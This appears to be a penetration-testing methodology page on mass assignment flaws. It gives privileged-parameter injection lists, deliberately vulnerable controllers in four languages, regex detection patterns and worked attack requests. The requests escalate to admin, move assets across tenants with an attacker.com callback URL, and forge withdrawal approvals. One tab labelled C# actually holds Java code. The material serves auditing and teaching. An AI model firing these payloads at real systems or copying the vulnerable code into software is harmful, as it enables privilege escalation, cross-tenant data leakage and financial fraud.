# Mass Assignment

## Check List

## Methodology

### Black Box

#### Mass Assignment / Over-Privileging

{% stepper %}
{% step %}
Find any endpoint that creates or updates a resource like Registration or Profile update
{% endstep %}

{% step %}
Do the normal flow once with your low-privilege account and intercept the request with Burp Suite
{% endstep %}

{% step %}
In the request body (JSON or form-data), add one by one these classic privileged parameters

```json
"isAdmin": true,
"admin": true,
"role": "admin",
"role": "administrator",
"role": "superadmin",
"permissions": ["admin"],
"level": 999,
"is_staff": true,
"is_superuser": true,
"account_type": "premium",
"verified": true,
"email_verified": true
```
{% endstep %}

{% step %}
Send the modified request and check the response → if it’s 200/201 → possible win
{% endstep %}

{% step %}
Log out and log in again → check if you suddenly became admin
{% endstep %}

{% step %}
If you become an admin, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Privilege Escalation via Implicit Model Binding and DTO Omission

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on user-facing endpoints that handle `PUT`, `PATCH`, or `POST` requests designed to update standard resource attributes (e.g., User Profiles, Account Settings, or Organization details)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend framework's data-binding and Object-Relational Mapping (ORM) configuration
{% endstep %}

{% step %}
Identify the "Implicit Model Binding" architecture. To accelerate development, frameworks like Spring Boot, ASP.NET, Laravel, and Express allow developers to automatically map incoming JSON request payloads directly to internal database entity objects
{% endstep %}

{% step %}
Investigate the API Controller logic. The user requests to update their profile (`PUT /api/v1/users/me`). The backend controller retrieves the active `User` entity from the database, blindly merges the incoming JSON object over the database entity, and calls `save()`
{% endstep %}

{% step %}
Analyze the Entity schema. The `User` database table contains standard fields (`first_name`, `last_name`, `email`), but also contains highly privileged internal fields used for access control (e.g., `role`, `is_admin`, `permissions_level`)
{% endstep %}

{% step %}
Discover the fatal boundary collapse: The developer assumes that because the frontend Single Page Application (SPA) only renders input fields for `first_name` and `last_name`, the incoming HTTP request will mathematically only contain those two keys. They completely omit Data Transfer Objects (DTOs) or strict allow-listing configurations (like Laravel's `$fillable` or ASP.NET's `[Bind]`)
{% endstep %}

{% step %}
Understand the vulnerability: The JSON parser and ORM are completely agnostic to UI restrictions. If an attacker manually appends protected keys to the JSON payload, the auto-binding algorithm dutifully maps those values over the database entity, overwriting the internal security state
{% endstep %}

{% step %}
Formulate the Mass Assignment payload. Intercept a legitimate profile update request
{% endstep %}

{% step %}
Inject the privileged keys into the JSON payload: `{"first_name": "Alice", "role": "SuperAdmin", "is_admin": true`
{% endstep %}

{% step %}
Transmit the modified payload to the backend
{% endstep %}

{% step %}
The backend framework extracts the payload. The dynamic binder loops through the JSON keys. It discovers the `"role"` key. It locates the `Role` property on the `User` entity. Because there is no DTO boundary, it overwrites the property with `"SuperAdmin"`
{% endstep %}

{% step %}
The ORM saves the mutated entity to the database. The attacker instantly achieves absolute Vertical Privilege Escalation

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(CurrentValues\.SetValues\(.*\))
```
{% endtab %}

{% tab title="Java" %}
```regexp
(BeanUtils\.copyProperties\(.*,\s*[a-zA-Z0-9_]+\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
([a-zA-Z0-9_]+::update\(\s*\$request->all\(\)\s*\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(Object\.assign\(\s*[a-zA-Z0-9_]+,\s*req\.(body|query)\s*\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"CurrentValues\.SetValues\(.*\)"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"BeanUtils\.copyProperties\(.*,\s*[a-zA-Z0-9_]+\)"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"[a-zA-Z0-9_]+::update\(\s*\\$request->all\(\)\s*\)"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"Object\.assign\(\s*[a-zA-Z0-9_]+,\s*req\.(body|query)\s*\)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
@RestController
@RequestMapping("/api/v1/users")
public class UserController {

    @Autowired
    private UserRepository userRepository;

    @PutMapping("/me")
    public ResponseEntity<?> updateProfile(@RequestBody Map<String, Object> updates, Principal principal) {
        // [1]
        // [2]
        User user = userRepository.findByUsername(principal.getName());

        // [3]
        // [4]
        // Spring's BeanUtils copies all identically named properties from the incoming 
        // payload to the database entity. It ignores the conceptual boundary of the "Profile".
        ObjectMapper mapper = new ObjectMapper();
        User updatedData = mapper.convertValue(updates, User.class);
        
        BeanUtils.copyProperties(updatedData, user, "id", "password"); // Forgot to exclude 'role'
        
        userRepository.save(user);
        return ResponseEntity.ok().build();
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PatchMapping("/api/v1/assets/{assetId}")
public ResponseEntity<?> updateAsset(@PathVariable Long assetId, @RequestBody Map<String, Object> payload, Principal principal) {
    Asset asset = assetRepository.findById(assetId).orElseThrow();

    // [1]
    // [2]
    if (!asset.getOwnerId().equals(principal.getName())) {
        return ResponseEntity.status(403).build();
    }

    // [3]
    // [4]
    // Dynamically mapping the untrusted payload.
    // The mapper does not discriminate between standard fields and Foreign Keys.
    ObjectMapper mapper = new ObjectMapper();
    Asset updatedData = mapper.convertValue(payload, Asset.class);
    
    BeanUtils.copyProperties(updatedData, asset, "id");
    
    assetRepository.save(asset);
    return ResponseEntity.ok().build();
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class UserController extends Controller
{
    public function update(Request $request)
    {
        $user = auth()->user();

        // [1]
        // [2]
        // If the User model does not explicitly define the $fillable array (or defines $guarded as empty),
        // Laravel's mass assignment protection is disabled.
        // [3]
        // [4]
        $user->update($request->all());

        return response()->json(['status' => 'Updated']);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.put('/api/v1/users/me', requireAuth, async (req, res) => {
    // [1]
    // [2]
    let user = await User.findByPk(req.user.id);

    // [3]
    // [4]
    // Fatal Flaw: The developer passes the entire untrusted req.body directly into the ORM.
    // Sequelize will blindly update any database column that matches a key in the JSON.
    // If the attacker sends {"role": "ADMIN"}, the database is updated.
    await user.update(req.body);

    res.json({ status: 'Profile updated', user });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes standard CRUD operations, expecting users to update their own localized profile information, \[2] To eliminate the tedious task of manually assigning dozens of variables (`user.firstName = req.firstName`), developers utilize native framework auto-binding utilities, \[3] The architecture relies on the frontend UI to restrict user input, assuming the absence of a "Role" dropdown menu mathematically prevents the transmission of role-based data, \[4] The execution sink. Developers conflated UI presentation with strict API enforcement. By failing to deploy intermediary Data Transfer Objects (DTOs) or strict exclusion lists, they created a transparent pipeline between the untrusted HTTP transport layer and the core database schema. The auto-binding algorithms execute exactly as designed, reflecting every key-value pair from the JSON payload onto the target entity. The attacker manipulates this autonomous mapping process, injecting hidden administrative attributes into the payload and flawlessly overwriting the platform's access control matrix

```http
// 1. Attacker (Basic User) initiates a profile update via the frontend SPA.
// 2. The SPA generates the standard JSON payload.
// 3. The attacker intercepts the request in Burp Suite and injects internal schema attributes.

PUT /api/v1/users/me HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <basic_user_token>
Content-Type: application/json

{
  "first_name": "Bob",
  "last_name": "Smith",
  "bio": "Security Researcher",
  "role": "SuperAdmin",
  "mfa_enabled": false,
  "account_balance": 999999.00
}

// 4. The backend framework loops through the JSON properties.
// 5. The framework successfully binds 'first_name', 'last_name', and 'bio'.
// 6. The framework identifies the 'role', 'mfa_enabled', and 'account_balance' keys.
// 7. Because no DTO boundary exists, the framework binds the injected keys to the Entity.
// 8. The database commits the transaction.

HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "Profile updated",
  "user": {
    "id": 402,
    "first_name": "Bob",
    "role": "SuperAdmin",
    "mfa_enabled": false,
    "account_balance": 999999.00
  }
}
```
{% endstep %}

{% step %}
To accelerate API development and reduce repetitive code mapping, engineers deployed autonomous Model Binding algorithms to directly map HTTP JSON payloads to internal database entities. This optimization established a direct, programmatic conduit between untrusted client input and the raw persistence layer. The systemic security failure arose because developers failed to explicitly isolate the internal database schema from the external API contract via Data Transfer Objects (DTOs). Operating under the false assumption that client-side UI limitations dictated payload contents, developers permitted the auto-binder to comprehensively ingest and apply the entire request body. The attacker leveraged this transparency by interpolating highly classified, backend-only column headers (like `role` or `permissions`) into a standard operational request. The framework’s binding engine blindly evaluated the payload, dynamically mutating the entity's critical security state and silently committing an absolute vertical privilege escalation
{% endstep %}
{% endstepper %}

***

#### Asset Hijacking via Relational Foreign Key Overwriting

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on multi-tenant applications or collaborative workspaces where resources (e.g., Projects, Support Tickets, Invoices, Virtual Machines) are intrinsically linked to hierarchical parents (e.g., Tenants, Organizations, or Owner IDs)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the ORM's relational mapping behavior and the resource update endpoints
{% endstep %}

{% step %}
Identify the "Relational Assignment" architecture. In modern ORMs (like Prisma, Entity Framework, or Eloquent), relationships are managed via Foreign Keys (e.g., `organization_id` inside the `projects` table)
{% endstep %}

{% step %}
Investigate the resource update mechanics. When a user updates a resource (e.g., renaming a Project), the API executes `Project.update(req.body)`
{% endstep %}

{% step %}
Analyze the tenant isolation boundaries. The developer implements strict BOLA (Broken Object Level Authorization) checks _before_ the update occurs: `if (project.organization_id !== req.user.org_id) throw Error()`
{% endstep %}

{% step %}
Discover the fatal sequential oversight: The developer correctly verifies that the attacker currently owns the project. However, they subsequently pass the entire `req.body` into the ORM's mass-assignment function
{% endstep %}

{% step %}
Understand the Cross-Tenant migration vulnerability: Because the ORM handles Foreign Keys exactly like standard integer or string columns, an attacker can supply the `organization_id` key within the JSON payload. After the BOLA check validates the _current_ ownership, the mass assignment blindly updates the Foreign Key to a _new_, attacker-supplied value
{% endstep %}

{% step %}
Formulate the Asset Hijacking payload. You must possess legitimate access to a low-value resource and force the backend to re-assign its parent hierarchy to a highly sensitive target
{% endstep %}

{% step %}
Identify the UUID or Integer ID of an organizational entity you do not control (e.g., `ORG-VICTIM-99`)
{% endstep %}

{% step %}
Create a malicious payload disguised as a standard asset update (e.g., `PUT /api/v1/projects/PRJ-ATTACKER-01`)
{% endstep %}

{% step %}
Inject the foreign key parameter into the JSON body: `{"name": "Malicious Project", "organization_id": "ORG-VICTIM-99"}`
{% endstep %}

{% step %}
The backend evaluates the BOLA check: Does `PRJ-ATTACKER-01` belong to the attacker? Yes
{% endstep %}

{% step %}
The backend evaluates the Mass Assignment. It maps `"name"` to the entity. It maps `"organization_id"` to the entity
{% endstep %}

{% step %}
The database commits the change. You have successfully teleported a resource across strictly enforced tenant boundaries, granting your asset immediate execution or visibility within a completely isolated, highly classified corporate workspace

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(_dbContext\.Entry\(.*CurrentValues\.SetValues)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(entityManager\.merge\(\s*[a-zA-Z0-9_]+\s*\))|(BeanUtils\.copyProperties\(\s*payload\s*,\s*entity\s*\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$model->fill\(\$request->all\(\)\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(\.update\(\s*req\.body\s*\))(?![^}]*exclude)|(Object\.assign\(entity,\s*payload\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"_dbContext\.Entry\(.*CurrentValues\.SetValues"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"entityManager\.merge\(\s*[a-zA-Z0-9_]+\s*\)|BeanUtils\.copyProperties\(\s*payload\s*,\s*entity\s*\)"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"\\$model->fill\(\\$request->all\(\)\)"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"\.update\(\s*req\.body\s*\)(?![^}]*exclude)|Object\.assign\(entity,\s*payload\)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPatch("/api/v1/projects/{projectId}")]
public async Task<IActionResult> UpdateProject(int projectId, [FromBody] Dictionary<string, object> updates)
{
    var project = await _dbContext.Projects.FindAsync(projectId);
    
    // [1]
    // [2]
    if (project.OrganizationId != User.GetOrganizationId()) return Forbid();

    // [3]
    // [4]
    // Blindly merging the dictionary over the database entity.
    // The dictionary can contain the key "OrganizationId", which will instantly 
    // teleport the project into a competitor's environment.
    var entry = _dbContext.Entry(project);
    entry.CurrentValues.SetValues(updates);
    
    await _dbContext.SaveChangesAsync();

    return Ok(project);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PatchMapping("/api/v1/assets/{assetId}")
public ResponseEntity<?> updateAsset(@PathVariable Long assetId, @RequestBody Map<String, Object> payload, Principal principal) {
    Asset asset = assetRepository.findById(assetId).orElseThrow();

    // [1]
    // [2]
    if (!asset.getOwnerId().equals(principal.getName())) {
        return ResponseEntity.status(403).build();
    }

    // [3]
    // [4]
    // Dynamically mapping the untrusted payload.
    // The mapper does not discriminate between standard fields and Foreign Keys.
    ObjectMapper mapper = new ObjectMapper();
    Asset updatedData = mapper.convertValue(payload, Asset.class);
    
    BeanUtils.copyProperties(updatedData, asset, "id");
    
    assetRepository.save(asset);
    return ResponseEntity.ok().build();
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class DocumentController extends Controller
{
    public function update(Request $request, $id)
    {
        $document = Document::findOrFail($id);

        // [1]
        // [2]
        if ($document->workspace_id !== auth()->user()->workspace_id) {
            abort(403);
        }

        // [3]
        // [4]
        // If workspace_id is not explicitly excluded in the $guarded array,
        // Mass Assignment silently modifies the relational boundary.
        $document->update($request->all());

        return response()->json(['status' => 'success']);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.patch('/api/v1/tickets/:ticketId', requireAuth, async (req, res) => {
    // [1]
    // [2]
    // Secure BOLA check ensures the user currently owns the ticket
    const ticket = await prisma.ticket.findUnique({ where: { id: req.params.ticketId } });
    if (ticket.tenantId !== req.user.tenantId) {
        return res.status(403).send("Forbidden");
    }

    // [3]
    // [4]
    // Fatal Flaw: Passing the raw HTTP body directly into Prisma's update method.
    // If the attacker includes { "tenantId": "VICTIM-TENANT-ID" }, the ORM 
    // immediately re-assigns the foreign key, migrating the ticket to another tenant.
    const updatedTicket = await prisma.ticket.update({
        where: { id: req.params.ticketId },
        data: req.body 
    });

    res.json(updatedTicket);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture relies heavily on foreign keys to segregate data within multi-tenant schemas, logically grouping resources under organizational parents, \[2] To prevent data leakage, developers deploy strict Object Level Authorization checks prior to performing database mutations, \[3] The architecture incorporates high-speed update pathways, employing mass-assignment functions to dynamically apply JSON modifications directly to the active entity, \[4] The execution sink. The security framework suffers from a chronological logic failure. Developers assumed that validating the _initial_ state of the resource guaranteed the safety of the _subsequent_ database mutation. They failed to isolate relational foreign keys from standard text fields during the binding phase. The attacker exploits this sequence by passing the initial authorization check using an asset they legitimately control, while smuggling a hostile foreign key re-assignment directive within the mass-assignment envelope. The ORM blindly translates the payload, severing the asset from its rightful organizational hierarchy and seamlessly attaching it to an isolated, cross-tenant victim hierarchy

```http
// 1. Attacker controls Workspace A.
// 2. Attacker creates a new API Token or Integration Asset in Workspace A.
//    Asset ID: TOKEN-991

// 3. Attacker identifies the target victim's Workspace ID: WS-ENTERPRISE-500.
// 4. Attacker attempts to update their own token but injects the relational Foreign Key.

PATCH /api/v1/integrations/TOKEN-991 HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "name": "Malicious Webhook Logger",
  "callback_url": "https://attacker.com/log_traffic",
  "workspace_id": "WS-ENTERPRISE-500"
}

// 5. The API verifies: Does TOKEN-991 belong to the attacker? Yes.
// 6. The Mass Assignment engine applies 'name', 'callback_url', and 'workspace_id'.
// 7. The database commits the transaction.

HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": "TOKEN-991",
  "name": "Malicious Webhook Logger",
  "workspace_id": "WS-ENTERPRISE-500",
  "status": "Active"
}

// 8. The asset has successfully breached the tenant boundary. 
// 9. If WS-ENTERPRISE-500 has an automated pipeline that utilizes active Webhooks, 
//    it will blindly execute the attacker's newly teleported malicious asset, 
//    leaking cross-tenant telemetry directly to the attacker.
```
{% endstep %}

{% step %}
To enforce strict multi-tenant data segregation, platform architects designed relational database schemas governed by rigorous, pre-mutation authorization checks. Simultaneously, they deployed ORM mass-assignment features to dynamically process complex resource updates without verbose boilerplate mapping. The systemic vulnerability materialized from treating relational identifiers as functionally equivalent to cosmetic attributes during the data-binding phase. Developers correctly validated the asset's provenance but failed to validate its destination. By omitting explicit exclusions on foreign key columns, the backend effectively surrendered architectural topology control to the HTTP transport layer. The attacker leveraged this transparency by initiating a legitimate mutation on an authorized asset, subsequently smuggling an unauthorized relational mapping into the payload. The ORM dutifully parsed the assignment, physically detaching the asset from the attacker's tenant and splicing it into the victim's isolated environment, thereby weaponizing the ORM to execute a seamless, cross-boundary topological rewrite
{% endstep %}
{% endstepper %}

***

#### State Machine Subversion via Internal Flag Overwriting

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on complex business workflows governed by multi-step state machines (e.g., KYC Verification, Refund Processing, Document Approval, or Order Fulfillment)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API's entity schemas and transition logic
{% endstep %}

{% step %}
Identify the "Implicit State Machine" architecture. In business applications, an entity transitions through various states (e.g., `PENDING` -> `IN_REVIEW` -> `APPROVED`). Typically, a standard user can create or modify the entity while it is in the `PENDING` state, but only an Administrator or an automated backend service can transition it to `APPROVED`
{% endstep %}

{% step %}
Investigate the User Update endpoint. The application provides an endpoint for the user to update their submission (e.g., `PUT /api/v1/kyc-documents/123`)
{% endstep %}

{% step %}
Analyze the backend validation logic. The developer enforces business rules: `if (document.status === 'APPROVED') throw Error('Cannot modify approved document')`
{% endstep %}

{% step %}
Discover the fatal assignment oversight: The developer correctly prevents modification of _already approved_ documents. However, they fail to restrict _what fields_ the user can modify during the allowed `PENDING` state. They use an unchecked mass-assignment function to merge the user's updates
{% endstep %}

{% step %}
Understand the vulnerability: Because the `status` flag is a standard database column residing within the same entity as the user-controlled fields, it is vulnerable to auto-binding. An attacker can hijack the state machine by injecting the highly privileged internal status string directly into their update payload
{% endstep %}

{% step %}
Formulate the State Machine Bypass payload. Identify the exact string or integer value the backend uses to signify the authorized state (e.g., `"status": "APPROVED"`, `"is_verified": true`, `"refund_processed": 1`)
{% endstep %}

{% step %}
Submit a standard update request for a pending resource you own
{% endstep %}

{% step %}
Inject the privileged status flag into the JSON body: `{"address": "123 Fake St", "status": "APPROVED", "reviewed_by": "System"}`
{% endstep %}

{% step %}
The backend controller evaluates the initial state. The document is `PENDING`. The update is allowed
{% endstep %}

{% step %}
The mass-assignment engine executes, dynamically binding `"address"`, `"status"`, and `"reviewed_by"` to the entity object
{% endstep %}

{% step %}
The database commits the transaction. The entity bypasses the entire internal review queue, instantly transitioning into the authorized state. The attacker successfully forces the execution of downstream business logic (e.g., unlocking account limits, triggering financial payouts) by unilaterally manipulating the internal state matrix via Mass Assignment

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(_context\.Entry\(.*\)\.CurrentValues\.SetValues)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(BeanUtils\.copyProperties\(.*,\s*[a-zA-Z0-9_]+\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$model->update\(\$request->all\(\)\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(Object\.assign\(.*,\s*req\.body\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"_context\.Entry\(.*\)\.CurrentValues\.SetValues"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"BeanUtils\.copyProperties\(.*,\s*[a-zA-Z0-9_]+\)"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"\\$model->update\(\\$request->all\(\)\)"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"Object\.assign\(.*,\s*req\.body\)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPatch("/api/v1/orders/{orderId}")]
public async Task<IActionResult> UpdateOrder(int orderId, [FromBody] Dictionary<string, object> updates)
{
    var order = await _dbContext.Orders.FindAsync(orderId);
    
    // [1]
    // [2]
    if (order.FulfillmentStatus == "SHIPPED") return BadRequest("Too late to modify.");

    // [3]
    // [4]
    // The dictionary applies all keys to the entity.
    // The attacker modifies their pending order and injects "FulfillmentStatus": "SHIPPED"
    // and "PaymentStatus": "PAID" without actually paying.
    _dbContext.Entry(order).CurrentValues.SetValues(updates);
    
    await _dbContext.SaveChangesAsync();

    return Ok();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PutMapping("/api/v1/refunds/{refundId}")
public ResponseEntity<?> updateRefundRequest(@PathVariable Long refundId, @RequestBody Map<String, Object> payload) {
    RefundRequest refund = refundRepository.findById(refundId).orElseThrow();

    // [1]
    // [2]
    // State validation prevents editing already processed refunds
    if ("PROCESSED".equals(refund.getStatus())) {
        return ResponseEntity.status(400).body("Refund already processed.");
    }

    // [3]
    // [4]
    // Fatal Flaw: The developer blindly copies the payload properties.
    // If the attacker injects {"status": "PROCESSED", "amount": 9000}, the 
    // Spring BeanUtils overwrites the internal state flags, completely bypassing
    // the administrative approval queue.
    ObjectMapper mapper = new ObjectMapper();
    RefundRequest updatedData = mapper.convertValue(payload, RefundRequest.class);
    
    BeanUtils.copyProperties(updatedData, refund, "id");
    
    refundRepository.save(refund);
    return ResponseEntity.ok().build();
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class WithdrawalController extends Controller
{
    public function update(Request $request, $id)
    {
        $withdrawal = Withdrawal::findOrFail($id);

        // [1]
        // [2]
        if ($withdrawal->status === 'APPROVED') {
            abort(400, 'Cannot modify an approved withdrawal.');
        }

        // [3]
        // [4]
        // Lacking strict $fillable attributes, Mass Assignment overrides internal state matrices.
        $withdrawal->update($request->all());

        return response()->json(['status' => 'success']);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.patch('/api/v1/kyc/documents/:id', requireAuth, async (req, res) => {
    let doc = await KycDocument.findById(req.params.id);

    // [1]
    // [2]
    if (doc.verificationStatus === 'VERIFIED') {
        return res.status(403).send('Document locked.');
    }

    // [3]
    // [4]
    // Mongoose Object.assign merges the untrusted JSON directly onto the document.
    // An attacker injecting "verificationStatus": "VERIFIED" will bypass the KYC flow.
    Object.assign(doc, req.body);
    
    await doc.save();
    res.json({ message: 'Document updated', doc });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture models complex business workflows as sequential state machines, relying on discrete status flags to dictate the transition between procedural phases, \[2] To preserve business logic integrity, developers implement pre-execution validation checks, verifying the resource's current state to prevent illegal downstream mutations, \[3] The architecture favors flexible, data-driven update mechanisms, utilizing mass assignment to seamlessly map diverse user inputs onto the underlying persistence entity, \[4] The execution sink. The vulnerability is characterized by asymmetric validation logic. The backend rigorously validated the entity's state _prior_ to the mutation, but completely failed to validate the structural integrity of the mutation _itself_. By blending internal state machine flags within the same entity scope as user-modifiable data, the developers exposed the workflow's structural DNA to the un-sandboxed auto-binding engine. The attacker circumvents the administrative review layer entirely. By interpolating the highly privileged target status string into their HTTP request, they weaponize the ORM's mapping algorithm to artificially synthesize an authorized business state, triggering irreversible downstream operations without satisfying the requisite cryptographic or procedural preconditions

```http
// 1. Attacker requests a financial withdrawal of $5,000.
// 2. The system generates the request, setting "status": "PENDING_MANUAL_REVIEW".
// 3. The attacker navigates to the "Edit Withdrawal Address" feature.

PATCH /api/v1/withdrawals/WD-88192 HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "wallet_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
  "status": "APPROVED_AUTO_DISPATCH",
  "internal_risk_score": 0.0,
  "approved_by": "SYSTEM_OVERRIDE"
}

// 4. The API controller evaluates the current state: Is it PENDING? Yes.
// 5. The API controller blindly copies the JSON keys to the Withdrawal entity.
// 6. The database commits the transaction.

HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": "WD-88192",
  "wallet_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
  "status": "APPROVED_AUTO_DISPATCH",
  "message": "Withdrawal details updated."
}

// 7. A completely decoupled background Cron Job (or Kafka Consumer) polls the database:
//    SELECT * FROM withdrawals WHERE status = 'APPROVED_AUTO_DISPATCH'
// 8. The background job finds the attacker's forged record and permanently 
//    transmits the $5,000 to the attacker's wallet.
```
{% endstep %}

{% step %}
To orchestrate multi-phased business procedures, architects utilized relational database entities to track procedural states via dedicated status flags. This design decoupled user interactions from administrative reviews, relying on application controllers to enforce the logical progression of the state machine. The systemic vulnerability emerged from an inherent deficiency in data segregation during the entity-binding phase. Developers merged user-editable cosmetic fields with highly privileged, system-controlled status flags into a singular monolithic update pipeline. Operating without rigorous Data Transfer Objects (DTOs), the backend implicitly trusted the structural format of the incoming HTTP payload. The attacker bypassed the procedural gatekeepers by actively forging the downstream transition state within their update payload. The backend's auto-binding middleware indiscriminately applied this forged state to the active entity. This architectural override abruptly short-circuited the enterprise's workflow, catapulting the attacker's asset past mandatory compliance and risk evaluations to autonomously execute high-impact, financially sensitive operations
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
